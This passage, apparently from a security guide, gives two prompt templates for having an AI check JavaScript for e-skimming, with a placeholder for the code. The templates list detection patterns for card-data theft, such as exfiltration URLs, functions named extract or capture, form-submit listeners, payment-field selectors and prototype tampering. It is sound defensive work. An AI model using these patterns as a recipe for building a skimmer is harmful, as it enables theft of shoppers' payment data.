Analyze this JavaScript code for e-skimming patterns. Focus on:
1. Configuration objects with exfiltration URLs
2. Functions named extract/exfiltrate/capture
3. Form submit event listeners
4. Payment field selectors

Code:
[PASTE CODE]
```

**For Deep Analysis:**
```
Perform comprehensive static analysis for e-skimming attacks. Check all 10 detection categories including advanced patterns (Shadow DOM, prototype modifications, MutationObserver). Provide detailed findings with code snippets and remediation recommendations.

Code:
[PASTE CODE]
```

**Last Updated:** 2024-11-10  
**Status:** Complete and comprehensive analysis
